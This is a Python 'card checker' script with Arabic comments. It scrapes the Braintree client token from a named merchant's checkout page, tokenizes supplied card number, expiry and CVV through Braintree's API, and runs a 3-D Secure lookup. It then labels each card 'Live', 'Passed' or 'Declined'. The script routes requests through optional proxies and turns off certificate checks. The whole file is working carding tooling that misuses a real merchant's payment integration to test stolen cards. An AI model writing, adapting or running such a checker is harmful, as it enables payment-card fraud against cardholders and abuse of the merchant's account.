"""
بوابة الدفع: Braintree 3DS Passed LookUp Single
الموقع: www.suspensionlifts.com
نوع البوابة: Braintree 3DS LookUp
تدفق الطلبات:
1. GET /checkout/ -> استخراج authorizationFingerprint من client_token (base64 decode)
2. POST https://payments.braintree-api.com/graphql (TokenizeCreditCard) -> الحصول على tok
3. POST https://api.braintreegateway.com/merchants/zkfxm943krx3chf3/client_api/v1/payment_methods/{tok}/three_d_secure/lookup -> النتيجة النهائية
"""
import aiohttp
import asyncio
import uuid
import ssl
import re
import base64
import json

MERCHANT_ID = "zkfxm943krx3chf3"
MERCHANT_SITE = "www.suspensionlifts.com"


async def req1_get_auth_fingerprint(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: جلب authorizationFingerprint من صفحة الـ Checkout."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    try:
        async with session.get(
            f"https://{MERCHANT_SITE}/checkout/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()
        token_match = re.search(r'"client_token"\s*:\s*"([^"]+)"', text)
        if not token_match:
            raise RuntimeError("clientToken not found in page")
        client_token_b64 = token_match.group(1)
        client_token_json = json.loads(base64.b64decode(client_token_b64).decode("utf-8"))
        auth_fingerprint = client_token_json.get("authorizationFingerprint", "")
        if not auth_fingerprint:
            raise RuntimeError("authorizationFingerprint not found in clientToken")
        return auth_fingerprint
    except Exception as e:
        raise RuntimeError(f"req1_get_auth_fingerprint failed: {e}") from e


async def req2_tokenize_card(
    session: aiohttp.ClientSession,
    auth_fingerprint: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: تحويل بيانات البطاقة إلى Braintree token عبر GraphQL."""
    headers = {
        "authorization": f"Bearer {auth_fingerprint}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    query = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(uuid.uuid4()),
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { creditCard { token } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mes,
                    "expirationYear": ano,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
    }
    try:
        async with session.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=query,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)
        tok = res.get("data", {}).get("tokenizeCreditCard", {}).get("creditCard", {}).get("token", "")
        if not tok:
            raise RuntimeError("Tokenization Failed: token not returned")
        return tok
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req2_tokenize_card failed: {e}") from e


async def req3_3ds_lookup(
    session: aiohttp.ClientSession,
    tok: str,
    auth_fingerprint: str,
    cc: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 3: إجراء 3DS LookUp للحصول على حالة المصادقة."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    data = {
        "amount": "10.00",
        "additionalInfo": {"acsWindowSize": "03"},
        "bin": cc[:6],
        "dfReferenceId": str(uuid.uuid4()),
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(uuid.uuid4()),
        },
        "authorizationFingerprint": auth_fingerprint,
    }
    try:
        async with session.post(
            f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup",
            headers=headers,
            json=data,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req3_3ds_lookup failed: {e}") from e


async def process_B3_LookUp_single_passed(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree 3DS Passed LookUp Single."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            auth_fingerprint = await req1_get_auth_fingerprint(session, proxy_url)
            tok = await req2_tokenize_card(session, auth_fingerprint, cc, mes, ano, cvv, proxy_url)
            res = await req3_3ds_lookup(session, tok, auth_fingerprint, cc, proxy_url)
    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", str(e)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"
    status = res.get("status", "")
    if status == "challenge_required":
        return f"𝐋𝐢𝐯𝐞 ✅ | {cc}|{mes}|{ano}|{cvv}", "Challenge Required"
    elif status == "authenticate_successful":
        return f"𝐏𝐚𝐬𝐬𝐞𝐝 ✅ | {cc}|{mes}|{ano}|{cvv}", "Authenticate Successful"
    elif status == "authenticate_rejected":
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", "Authenticate Rejected"
    else:
        msg = res.get("message", status) if status else "Unknown Error"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", msg
